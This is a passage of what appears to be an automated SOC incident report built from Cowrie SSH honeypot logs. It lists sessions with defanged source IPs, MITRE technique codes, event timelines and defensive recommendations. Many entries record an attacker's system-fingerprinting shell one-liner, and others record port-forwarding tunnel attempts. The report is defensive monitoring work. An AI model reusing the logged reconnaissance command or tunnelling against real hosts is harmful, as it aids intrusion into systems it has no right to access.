+| `2026-08-22 15:20:24` | `cowrie.command.input` |
+| `2026-08-22 15:20:24` | `cowrie.command.input` |
+| `2026-08-22 15:20:24` | `cowrie.command.input` |
+| `2026-08-22 15:20:24` | `cowrie.command.input` |
+| `2026-08-22 15:20:25` | `cowrie.log.closed` |
+| `2026-08-22 15:20:26` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-13b7fc2b6536
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:21 |
+| **Last Seen** | 2026-08-22 15:22 |
+| **Session Duration** | 8s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:21:57` | `cowrie.session.connect` |
+| `2026-08-22 15:21:58` | `cowrie.client.version` |
+| `2026-08-22 15:21:58` | `cowrie.client.kex` |
+| `2026-08-22 15:22:02` | `cowrie.login.success` |
+| `2026-08-22 15:22:05` | `cowrie.session.params` |
+| `2026-08-22 15:22:05` | `cowrie.command.input` |
+| `2026-08-22 15:22:05` | `cowrie.command.input` |
+| `2026-08-22 15:22:05` | `cowrie.command.input` |
+| `2026-08-22 15:22:05` | `cowrie.command.input` |
+| `2026-08-22 15:22:05` | `cowrie.command.input` |
+| `2026-08-22 15:22:05` | `cowrie.command.success` |
+| `2026-08-22 15:22:05` | `cowrie.command.input` |
+| `2026-08-22 15:22:05` | `cowrie.command.input` |
+| `2026-08-22 15:22:05` | `cowrie.command.input` |
+| `2026-08-22 15:22:05` | `cowrie.command.input` |
+| `2026-08-22 15:22:05` | `cowrie.log.closed` |
+| `2026-08-22 15:22:06` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-00adafdfa26e
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:23 |
+| **Last Seen** | 2026-08-22 15:23 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:23:19` | `cowrie.session.connect` |
+| `2026-08-22 15:23:19` | `cowrie.client.version` |
+| `2026-08-22 15:23:19` | `cowrie.client.kex` |
+| `2026-08-22 15:23:22` | `cowrie.login.success` |
+| `2026-08-22 15:23:24` | `cowrie.session.params` |
+| `2026-08-22 15:23:24` | `cowrie.command.input` |
+| `2026-08-22 15:23:24` | `cowrie.command.input` |
+| `2026-08-22 15:23:24` | `cowrie.command.input` |
+| `2026-08-22 15:23:24` | `cowrie.command.input` |
+| `2026-08-22 15:23:24` | `cowrie.command.input` |
+| `2026-08-22 15:23:24` | `cowrie.command.success` |
+| `2026-08-22 15:23:24` | `cowrie.command.input` |
+| `2026-08-22 15:23:24` | `cowrie.command.input` |
+| `2026-08-22 15:23:24` | `cowrie.command.input` |
+| `2026-08-22 15:23:24` | `cowrie.command.input` |
+| `2026-08-22 15:23:25` | `cowrie.log.closed` |
+| `2026-08-22 15:23:25` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-e90826b6c08a
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:24 |
+| **Last Seen** | 2026-08-22 15:24 |
+| **Session Duration** | 8s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:24:47` | `cowrie.session.connect` |
+| `2026-08-22 15:24:48` | `cowrie.client.version` |
+| `2026-08-22 15:24:48` | `cowrie.client.kex` |
+| `2026-08-22 15:24:52` | `cowrie.login.success` |
+| `2026-08-22 15:24:55` | `cowrie.session.params` |
+| `2026-08-22 15:24:55` | `cowrie.command.input` |
+| `2026-08-22 15:24:55` | `cowrie.command.input` |
+| `2026-08-22 15:24:55` | `cowrie.command.input` |
+| `2026-08-22 15:24:55` | `cowrie.command.input` |
+| `2026-08-22 15:24:55` | `cowrie.command.input` |
+| `2026-08-22 15:24:55` | `cowrie.command.success` |
+| `2026-08-22 15:24:55` | `cowrie.command.input` |
+| `2026-08-22 15:24:55` | `cowrie.command.input` |
+| `2026-08-22 15:24:55` | `cowrie.command.input` |
+| `2026-08-22 15:24:55` | `cowrie.command.input` |
+| `2026-08-22 15:24:55` | `cowrie.log.closed` |
+| `2026-08-22 15:24:56` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-01552fd41917
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `46.201.247[.]21` |
+| **First Seen** | 2026-08-22 15:25 |
+| **Last Seen** | 2026-08-22 15:25 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:25:51` | `cowrie.session.connect` |
+| `2026-08-22 15:25:51` | `cowrie.client.version` |
+| `2026-08-22 15:25:51` | `cowrie.client.kex` |
+| `2026-08-22 15:25:52` | `cowrie.login.success` |
+| `2026-08-22 15:25:53` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:25:57` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
+- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-ca7e54afc186
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:26 |
+| **Last Seen** | 2026-08-22 15:26 |
+| **Session Duration** | 7s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:26:08` | `cowrie.session.connect` |
+| `2026-08-22 15:26:09` | `cowrie.client.version` |
+| `2026-08-22 15:26:09` | `cowrie.client.kex` |
+| `2026-08-22 15:26:11` | `cowrie.login.success` |
+| `2026-08-22 15:26:14` | `cowrie.session.params` |
+| `2026-08-22 15:26:14` | `cowrie.command.input` |
+| `2026-08-22 15:26:14` | `cowrie.command.input` |
+| `2026-08-22 15:26:14` | `cowrie.command.input` |
+| `2026-08-22 15:26:14` | `cowrie.command.input` |
+| `2026-08-22 15:26:14` | `cowrie.command.input` |
+| `2026-08-22 15:26:14` | `cowrie.command.success` |
+| `2026-08-22 15:26:14` | `cowrie.command.input` |
+| `2026-08-22 15:26:14` | `cowrie.command.input` |
+| `2026-08-22 15:26:14` | `cowrie.command.input` |
+| `2026-08-22 15:26:14` | `cowrie.command.input` |
+| `2026-08-22 15:26:14` | `cowrie.log.closed` |
+| `2026-08-22 15:26:15` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-473b44d2b7f4
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:27 |
+| **Last Seen** | 2026-08-22 15:27 |
+| **Session Duration** | 5s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:27:22` | `cowrie.session.connect` |
+| `2026-08-22 15:27:23` | `cowrie.client.version` |
+| `2026-08-22 15:27:23` | `cowrie.client.kex` |
+| `2026-08-22 15:27:25` | `cowrie.login.success` |
+| `2026-08-22 15:27:27` | `cowrie.session.params` |
+| `2026-08-22 15:27:27` | `cowrie.command.input` |
+| `2026-08-22 15:27:27` | `cowrie.command.input` |
+| `2026-08-22 15:27:27` | `cowrie.command.input` |
+| `2026-08-22 15:27:27` | `cowrie.command.input` |
+| `2026-08-22 15:27:27` | `cowrie.command.input` |
+| `2026-08-22 15:27:27` | `cowrie.command.success` |
+| `2026-08-22 15:27:27` | `cowrie.command.input` |
+| `2026-08-22 15:27:27` | `cowrie.command.input` |
+| `2026-08-22 15:27:27` | `cowrie.command.input` |
+| `2026-08-22 15:27:27` | `cowrie.command.input` |
+| `2026-08-22 15:27:27` | `cowrie.log.closed` |
+| `2026-08-22 15:27:28` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-b69088b24fd8
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:28 |
+| **Last Seen** | 2026-08-22 15:28 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:28:34` | `cowrie.session.connect` |
+| `2026-08-22 15:28:34` | `cowrie.client.version` |
+| `2026-08-22 15:28:34` | `cowrie.client.kex` |
+| `2026-08-22 15:28:35` | `cowrie.login.success` |
+| `2026-08-22 15:28:37` | `cowrie.session.params` |
+| `2026-08-22 15:28:37` | `cowrie.command.input` |
+| `2026-08-22 15:28:37` | `cowrie.command.input` |
+| `2026-08-22 15:28:37` | `cowrie.command.input` |
+| `2026-08-22 15:28:37` | `cowrie.command.input` |
+| `2026-08-22 15:28:37` | `cowrie.command.input` |
+| `2026-08-22 15:28:37` | `cowrie.command.success` |
+| `2026-08-22 15:28:37` | `cowrie.command.input` |
+| `2026-08-22 15:28:37` | `cowrie.command.input` |
+| `2026-08-22 15:28:37` | `cowrie.command.input` |
+| `2026-08-22 15:28:37` | `cowrie.command.input` |
+| `2026-08-22 15:28:38` | `cowrie.log.closed` |
+| `2026-08-22 15:28:38` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-9084e23fd569
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `121.1.120[.]2` |
+| **First Seen** | 2026-08-22 15:29 |
+| **Last Seen** | 2026-08-22 15:29 |
+| **Session Duration** | 9s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:29:27` | `cowrie.session.connect` |
+| `2026-08-22 15:29:28` | `cowrie.client.version` |
+| `2026-08-22 15:29:28` | `cowrie.client.kex` |
+| `2026-08-22 15:29:31` | `cowrie.login.success` |
+| `2026-08-22 15:29:32` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:29:36` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `121.1.120[.]2` to AbuseIPDB if not already reported
+- [ ] Block `121.1.120[.]2` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-8fdc062778c4
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 15:29 |
+| **Last Seen** | 2026-08-22 15:29 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:29:34` | `cowrie.session.connect` |
+| `2026-08-22 15:29:34` | `cowrie.client.version` |
+| `2026-08-22 15:29:34` | `cowrie.client.kex` |
+| `2026-08-22 15:29:35` | `cowrie.login.success` |
+| `2026-08-22 15:29:35` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:29:35` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:29:35` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:29:35` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-cbf5d5c50222
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `80.191.253[.]228` |
+| **First Seen** | 2026-08-22 15:29 |
+| **Last Seen** | 2026-08-22 15:29 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:29:37` | `cowrie.session.connect` |
+| `2026-08-22 15:29:37` | `cowrie.client.version` |
+| `2026-08-22 15:29:37` | `cowrie.client.kex` |
+| `2026-08-22 15:29:38` | `cowrie.login.success` |
+| `2026-08-22 15:29:39` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:29:43` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `80.191.253[.]228` to AbuseIPDB if not already reported
+- [ ] Block `80.191.253[.]228` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-997b71d48cb0
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `217.60.255[.]130` |
+| **First Seen** | 2026-08-22 15:29 |
+| **Last Seen** | 2026-08-22 15:29 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:29:38` | `cowrie.session.connect` |
+| `2026-08-22 15:29:38` | `cowrie.client.version` |
+| `2026-08-22 15:29:38` | `cowrie.client.kex` |
+| `2026-08-22 15:29:39` | `cowrie.login.success` |
+| `2026-08-22 15:29:39` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:29:40` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:29:40` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:29:40` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
+- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-8cd1a6ae1e3c
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:29 |
+| **Last Seen** | 2026-08-22 15:29 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:29:53` | `cowrie.session.connect` |
+| `2026-08-22 15:29:53` | `cowrie.client.version` |
+| `2026-08-22 15:29:53` | `cowrie.client.kex` |
+| `2026-08-22 15:29:54` | `cowrie.login.success` |
+| `2026-08-22 15:29:56` | `cowrie.session.params` |
+| `2026-08-22 15:29:56` | `cowrie.command.input` |
+| `2026-08-22 15:29:56` | `cowrie.command.input` |
+| `2026-08-22 15:29:56` | `cowrie.command.input` |
+| `2026-08-22 15:29:56` | `cowrie.command.input` |
+| `2026-08-22 15:29:56` | `cowrie.command.input` |
+| `2026-08-22 15:29:56` | `cowrie.command.success` |
+| `2026-08-22 15:29:56` | `cowrie.command.input` |
+| `2026-08-22 15:29:56` | `cowrie.command.input` |
+| `2026-08-22 15:29:56` | `cowrie.command.input` |
+| `2026-08-22 15:29:56` | `cowrie.command.input` |
+| `2026-08-22 15:29:56` | `cowrie.log.closed` |
+| `2026-08-22 15:29:57` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-5055fe56e974
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:31 |
+| **Last Seen** | 2026-08-22 15:31 |
+| **Session Duration** | 5s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:31:16` | `cowrie.session.connect` |
+| `2026-08-22 15:31:16` | `cowrie.client.version` |
+| `2026-08-22 15:31:16` | `cowrie.client.kex` |
+| `2026-08-22 15:31:17` | `cowrie.login.success` |
+| `2026-08-22 15:31:20` | `cowrie.session.params` |
+| `2026-08-22 15:31:20` | `cowrie.command.input` |
+| `2026-08-22 15:31:20` | `cowrie.command.input` |
+| `2026-08-22 15:31:20` | `cowrie.command.input` |
+| `2026-08-22 15:31:20` | `cowrie.command.input` |
+| `2026-08-22 15:31:20` | `cowrie.command.input` |
+| `2026-08-22 15:31:20` | `cowrie.command.success` |
+| `2026-08-22 15:31:20` | `cowrie.command.input` |
+| `2026-08-22 15:31:20` | `cowrie.command.input` |
+| `2026-08-22 15:31:20` | `cowrie.command.input` |
+| `2026-08-22 15:31:20` | `cowrie.command.input` |
+| `2026-08-22 15:31:20` | `cowrie.log.closed` |
+| `2026-08-22 15:31:21` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-2687c12fb1e7
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 15:32 |
+| **Last Seen** | 2026-08-22 15:32 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 15:32:46` | `cowrie.session.connect` |
+| `2026-08-22 15:32:46` | `cowrie.client.version` |
+| `2026-08-22 15:32:46` | `cowrie.client.kex` |
+| `2026-08-22 15:32:48` | `cowrie.login.success` |
+| `2026-08-22 15:32:49` | `cowrie.session.params` |
+| `2026-08-22 15:32:49` | `cowrie.command.input` |
+| `2026-08-22 15:32:49` | `cowrie.command.input` |
+| `2026-08-22 15:32:49` | `cowrie.command.input` |
+| `2026-08-22 15:32:49` | `cowrie.command.input` |
+| `2026-08-22 15:32:49` | `cowrie.command.input` |
+| `2026-08-22 15:32:49` | `cowrie.command.success` |
+| `2026-08-22 15:32:49` | `cowrie.command.input` |
+| `2026-08-22 15:32:49` | `cowrie.command.input` |
+| `2026-08-22 15:32:49` | `cowrie.command.input` |
+| `2026-08-22 15:32:49` | `cowrie.command.input` |
+| `2026-08-22 15:32:50` | `cowrie.log.closed` |
